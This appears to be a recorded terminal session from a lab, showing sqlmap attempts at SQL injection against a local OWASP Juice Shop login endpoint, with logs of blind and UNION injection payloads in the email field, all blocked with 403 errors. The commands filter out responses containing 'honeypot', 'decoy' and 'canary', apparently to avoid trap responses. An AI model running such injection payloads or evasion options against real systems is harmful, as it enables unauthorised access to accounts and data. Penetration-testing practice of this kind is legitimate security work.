+[17:04:39] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL AND time-based blind (ELT)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL OR time-based blind (ELT)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL AND time-based blind (ELT - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL OR time-based blind (ELT - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL > 8.1 AND time-based blind (comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL > 8.1 OR time-based blind (comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle AND time-based blind' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle OR time-based blind' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle AND time-based blind (comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle OR time-based blind (comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird >= 2.0 AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird >= 2.0 OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'SAP MaxDB AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'SAP MaxDB OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Informix AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Informix OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Informix AND time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Informix OR time-based blind (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'ClickHouse AND time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'ClickHouse OR time-based blind (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - Parameter replace (BENCHMARK)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL > 5.0.12 time-based blind - Parameter replace (heavy query - comment)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (bool)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (ELT)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL time-based blind - Parameter replace (MAKE_SET)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - Parameter replace' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle time-based blind - Parameter replace (heavy queries)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Firebird time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'SAP MaxDB time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'IBM DB2 time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Informix time-based blind - Parameter replace (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (BENCHMARK)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL > 8.1 time-based blind - ORDER BY, GROUP BY clause' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'PostgreSQL time-based blind - ORDER BY, GROUP BY clause (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Microsoft SQL Server/Sybase time-based blind - ORDER BY clause (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_LOCK.SLEEP)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'Oracle time-based blind - ORDER BY, GROUP BY clause (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB >= 1.7.2 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because its declared DBMS is different than provided
+[17:04:39] [DEBUG] skipping test 'HSQLDB > 2.0 time-based blind - ORDER BY, GROUP BY clause (heavy query)' because its declared DBMS is different than provided
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[17:04:39] [DEBUG] used the default behavior, running in batch mode
+[17:04:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[17:04:39] [PAYLOAD] admin@juice-sh.op) ORDER BY 1-- KmCo
+[17:04:39] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:39] [PAYLOAD] admin@juice-sh.op) ORDER BY 8022-- ezlj
+[17:04:40] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:40] [PAYLOAD] admin@juice-sh.op ORDER BY 1-- YOla
+[17:04:42] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:42] [PAYLOAD] admin@juice-sh.op ORDER BY 9128-- VsWL
+[17:04:46] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:46] [PAYLOAD] admin@juice-sh.op') ORDER BY 1-- TKRZ
+[17:04:49] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:49] [PAYLOAD] admin@juice-sh.op') ORDER BY 9693-- vITN
+[17:04:52] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:52] [PAYLOAD] admin@juice-sh.op' ORDER BY 1-- QvWn
+[17:04:56] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:04:56] [PAYLOAD] admin@juice-sh.op' ORDER BY 3806-- dDlt
+[17:05:00] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:05:00] [PAYLOAD] admin@juice-sh.op ORDER BY 1-- LxIV
+[17:05:04] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:05:04] [PAYLOAD] admin@juice-sh.op ORDER BY 1828-- AtkL
+[17:05:06] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:05:06] [DEBUG] skipping test 'Generic UNION query (random number) - 1 to 10 columns' because the level (3) is higher than the provided (1)
+[17:05:06] [DEBUG] skipping test 'Generic UNION query (NULL) - 11 to 20 columns' because the level (2) is higher than the provided (1)
+[17:05:06] [DEBUG] skipping test 'Generic UNION query (random number) - 11 to 20 columns' because the level (3) is higher than the provided (1)
+[17:05:06] [DEBUG] skipping test 'Generic UNION query (NULL) - 21 to 30 columns' because the level (3) is higher than the provided (1)
+[17:05:06] [DEBUG] skipping test 'Generic UNION query (random number) - 21 to 30 columns' because the level (4) is higher than the provided (1)
+[17:05:06] [DEBUG] skipping test 'Generic UNION query (NULL) - 31 to 40 columns' because the level (4) is higher than the provided (1)
+[17:05:06] [DEBUG] skipping test 'Generic UNION query (random number) - 31 to 40 columns' because the level (5) is higher than the provided (1)
+[17:05:06] [DEBUG] skipping test 'Generic UNION query (NULL) - 41 to 50 columns' because the level (5) is higher than the provided (1)
+[17:05:06] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 50 columns' because the level (5) is higher than the provided (1)
+[17:05:06] [DEBUG] skipping test 'MySQL UNION query (NULL) - 1 to 10 columns' because its declared DBMS is different than provided
+[17:05:06] [DEBUG] skipping test 'MySQL UNION query (random number) - 1 to 10 columns' because its declared DBMS is different than provided
+[17:05:06] [DEBUG] skipping test 'MySQL UNION query (NULL) - 11 to 20 columns' because its declared DBMS is different than provided
+[17:05:06] [DEBUG] skipping test 'MySQL UNION query (random number) - 11 to 20 columns' because its declared DBMS is different than provided
+[17:05:06] [DEBUG] skipping test 'MySQL UNION query (NULL) - 21 to 30 columns' because its declared DBMS is different than provided
+[17:05:06] [DEBUG] skipping test 'MySQL UNION query (random number) - 21 to 30 columns' because its declared DBMS is different than provided
+[17:05:06] [DEBUG] skipping test 'MySQL UNION query (NULL) - 31 to 40 columns' because its declared DBMS is different than provided
+[17:05:06] [DEBUG] skipping test 'MySQL UNION query (random number) - 31 to 40 columns' because its declared DBMS is different than provided
+[17:05:06] [DEBUG] skipping test 'MySQL UNION query (NULL) - 41 to 50 columns' because its declared DBMS is different than provided
+[17:05:06] [DEBUG] skipping test 'MySQL UNION query (random number) - 41 to 50 columns' because its declared DBMS is different than provided
+[17:05:06] [WARNING] (custom) POST parameter 'JSON #1*' does not seem to be injectable
+[17:05:06] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[17:05:06] [WARNING] HTTP error codes detected during run:
+429 (Too Many Requests) - 2 times, 403 (Forbidden) - 25 times
+[17:05:06] [DEBUG] too many 4xx and/or 5xx HTTP error codes could mean that some kind of protection is involved (e.g. WAF)
+[*] ending @ 17:05:06 /2026-04-24/
+[?2004h
+]0;yernur@yernur-VMware-Virtual-Platform: ~/Qwen3based
+yernur@yernur-VMware-Virtual-Platform:~/Qwen3based$ sqlmap -u "http://localhost:8080/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite  --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch --flush-session -v 3
+[Csqlmap -u "http://localhost:8080/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite  --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch --flush-session -v 3
+[Csqlmap -u "http://localhost:8080/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite  --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch --flush-session -v 3
+exit
+sqlmap -u "http://localhost:3000/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite  --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch --flush-session -v 3
+[C --technique B   --string "token"   --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not
+[36@-string "watermark"   --not-string "
+  --threads 10   --flush-session sqlmap -u "http://localhost:3000/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite   --technique B   --string "token"   --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch --flush-session -v 3\
+[17@  --threads 10   
+ignore-code 401   --batch   --threads 10   --flush-session \ -v 3 --answers "keep testing=Y"
+[40Pource qwensent/bin/activate
+[15Pcd Qwen3based
+sqlmap -u "http://localhost:3000/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite   --technique B   --string "token"   --ignore-code 401   --batch   --threads 10   --flush-session \ -v 3
+DpAAA
+qlmap -u "http://localhost:3000/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite   --level 3   --risk 1   --technique B   --string "token"   --batch   --threads 5   --flush-session --ignore-code 401
+]0;yernur@yernur-VMware-Virtual-Platform: ~/Qwen3based
+yernur@yernur-VMware-Virtual-Platform:~/Qwen3based$ 
+[CDpAAA
+qlmap -u "http://localhost:3000/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite   --technique B   --string "token"   --ignore-code 401   --batch   --threads 10   --flush-session \ -v 3
+[Ccd Qwen3based
+source qwensent/bin/activate
+qlmap -u "http://localhost:3000/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite   --technique B   --string "token"   --ignore-code 401   --batch   --threads 10   --flush-session \ -v 3 --answers "keep testing=Y"
+[Cnot-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch   --threads 10   --flush-session sqlmap -u "http://localhost:3000/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite   --technique B   --string "token"   --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch   --threads 10   --flush-session -v 3\
+[17P
+[14P--flush-session -v 3
+[C--not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "
+[36P
+exit
+sqlmap -u "http://localhost:8080/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite  --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch --flush-session -v 3
+[Csqlmap -u "http://localhost:8080/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite  --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch --flush-session -v 3
+exit
+[?2004lexit
+Script done on 2026-04-24 17:05:51+05:00 [COMMAND_EXIT_CODE="0"]
+Script started on 2026-04-24 17:05:54+05:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="120" LINES="15"]
+[?2004h
+]0;yernur@yernur-VMware-Virtual-Platform: ~/Qwen3based
+yernur@yernur-VMware-Virtual-Platform:~/Qwen3based$ sqlmap -u "http://localhost:8080/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite  --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch --flush-session -v 3
+[Csqlmap -u "http://localhost:8080/rest/user/login"   --data '{"email": "admin@juice-sh.op*", "password": "admin123"}'   --method POST   --headers "Content-Type: application/json"   --dbms sqlite  --not-string "honeypot"   --not-string "decoy"   --not-string "canary"   --not-string "watermark"   --not-string "test_env_honeypot"   --ignore-code 401   --batch --flush-session -v 3
+[C --ros
+sk 3 --level 3
+[?2004l        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.10.3#pip}
+|_ -| . [']     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[*] starting @ 17:06:13 /2026-04-24/
+[17:06:13] [DEBUG] cleaning up configuration parameters
+[17:06:13] [DEBUG] setting the HTTP timeout
+[17:06:13] [DEBUG] setting extra HTTP headers
+[17:06:13] [DEBUG] setting the HTTP User-Agent header
+[17:06:13] [DEBUG] creating HTTP requests opener object
+[17:06:13] [DEBUG] forcing back-end DBMS to user defined value
+[17:06:13] [DEBUG] setting the HTTP Referer header to the target URL
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+[17:06:13] [DEBUG] used the default behavior, running in batch mode
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[17:06:13] [DEBUG] used the default behavior, running in batch mode
+[17:06:13] [DEBUG] resolving hostname 'localhost'
+[17:06:13] [INFO] testing connection to the target URL
+[17:06:16] [DEBUG] got HTTP error code: 429 ('TOO MANY REQUESTS')
+[17:06:16] [WARNING] the web server responded with an HTTP error code (429) which could interfere with the results of the tests
+[17:06:16] [INFO] testing if (custom) POST parameter 'JSON #1*' is dynamic
+[17:06:16] [PAYLOAD] 5825
+[17:06:16] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:16] [WARNING] (custom) POST parameter 'JSON #1*' does not appear to be dynamic
+[17:06:16] [PAYLOAD] admin@juice-sh.op"(,,',.,(,
+[17:06:16] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:16] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
+[17:06:16] [PAYLOAD] admin@juice-sh.op'iFlpxV<'">jlYSxG
+[17:06:17] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:17] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
+[17:06:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:06:17] [PAYLOAD] admin@juice-sh.op) AND 5494=5056-- napL
+[17:06:17] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:17] [PAYLOAD] admin@juice-sh.op) AND 3908=3908-- vesK
+[17:06:18] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:18] [PAYLOAD] admin@juice-sh.op' AND 3071=9004-- GLeT
+[17:06:18] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:18] [PAYLOAD] admin@juice-sh.op' AND 3908=3908-- zJpX
+[17:06:18] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:18] [PAYLOAD] admin@juice-sh.op) AND 9407=2294 AND (1642=1642
+[17:06:19] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:19] [PAYLOAD] admin@juice-sh.op) AND 3908=3908 AND (6525=6525
+[17:06:19] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:19] [PAYLOAD] admin@juice-sh.op)) AND 4605=2856 AND ((2199=2199
+[17:06:20] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:20] [PAYLOAD] admin@juice-sh.op)) AND 3908=3908 AND ((2805=2805
+[17:06:20] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:20] [PAYLOAD] admin@juice-sh.op))) AND 4203=3120 AND (((2936=2936
+[17:06:20] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:20] [PAYLOAD] admin@juice-sh.op))) AND 3908=3908 AND (((7196=7196
+[17:06:21] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:21] [PAYLOAD] admin@juice-sh.op AND 2338=6081
+[17:06:21] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:21] [PAYLOAD] admin@juice-sh.op AND 3908=3908
+[17:06:22] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:22] [PAYLOAD] admin@juice-sh.op') AND 4759=2557 AND ('hIkQ'='hIkQ
+[17:06:22] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:22] [PAYLOAD] admin@juice-sh.op') AND 3908=3908 AND ('OJIT'='OJIT
+[17:06:23] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:23] [PAYLOAD] admin@juice-sh.op')) AND 7529=8967 AND (('HtKu'='HtKu
+[17:06:23] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:23] [PAYLOAD] admin@juice-sh.op')) AND 3908=3908 AND (('yTfX'='yTfX
+[17:06:26] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
+[17:06:26] [PAYLOAD] admin@juice-sh.op'))) AND 1008=7542 AND ((('RUVr'='RUVr
+[17:06:29] [DEBUG] got HTTP error code: 403 ('FORBIDDEN')
